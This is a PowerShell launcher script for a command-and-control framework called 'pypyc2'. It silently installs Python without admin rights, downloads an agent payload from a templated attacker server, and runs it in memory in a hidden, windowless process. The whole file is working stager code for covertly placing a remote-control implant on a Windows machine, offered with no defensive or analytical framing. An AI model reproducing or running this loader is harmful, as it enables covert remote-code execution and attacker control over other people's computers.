# pypyc2 Agent Launcher
# Auto-installs Python and executes agent in memory

# Check if Python is installed
$pythonExists = Get-Command python -ErrorAction SilentlyContinue
if (!$pythonExists) {
    Write-Host "[*] Python not found. Installing..."

    # Download Python installer (3.12.7 stable)
    $pythonUrl = "https://www.python.org/ftp/python/3.12.7/python-3.12.7-amd64.exe"
    $installerPath = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -UseBasicParsing

    # Install Python with minimal options (silent, user-level, no admin)
    Write-Host "[*] Installing Python (minimal, silent install)..."
    $installArgs = @(
        "/quiet",
        "InstallAllUsers=0",
        "PrependPath=1",
        "Include_test=0",
        "Include_doc=0",
        "Include_tcltk=0",
        "Shortcuts=0",
        "InstallLauncherAllUsers=0"
    )
    Start-Process -FilePath $installerPath -ArgumentList $installArgs -Wait -NoNewWindow

    # Refresh PATH
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","User") + ";" +
                [System.Environment]::GetEnvironmentVariable("Path","Machine")

    # Verify installation
    $pythonPath = Get-Command python -ErrorAction SilentlyContinue
    if (!$pythonPath) {
        # Fallback: Search in default location
        $pythonPath = Get-ChildItem -Path "$env:LOCALAPPDATA\Programs\Python" -Filter "python.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
        if (!$pythonPath) {
            Write-Host "[-] Python installation failed!"
            exit 1
        }
    } else {
        $pythonPath = $pythonPath.Source
    }

    Write-Host "[+] Python installed successfully"
} else {
    $pythonPath = $pythonExists.Source
}

# Install requests library
Write-Host "[*] Installing dependencies..."
& $pythonPath -m pip install --quiet --user requests 2>&1 | Out-Null

# Download agent code into memory
Write-Host "[*] Connecting to server..."
$serverUrl = "{{SERVER_URL}}"
try {
    $agentCode = (Invoke-WebRequest -Uri "http://$serverUrl/payload/allinone.py" -UseBasicParsing).Content
} catch {
    Write-Host "[-] Failed to connect to server: $_"
    exit 1
}

# Start agent in hidden background process (in-memory execution!)
Write-Host "[*] Starting agent..."
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $pythonPath
$psi.Arguments = "- $serverUrl"
$psi.UseShellExecute = $false
$psi.RedirectStandardInput = $true
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError = $true
$psi.CreateNoWindow = $true
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

$process = New-Object System.Diagnostics.Process
$process.StartInfo = $psi
$process.Start() | Out-Null

# Write agent code to stdin
$process.StandardInput.Write($agentCode)
$process.StandardInput.Close()

Write-Host "[+] Agent started successfully (PID: $($process.Id))"
Write-Host "[*] This window can now be closed"
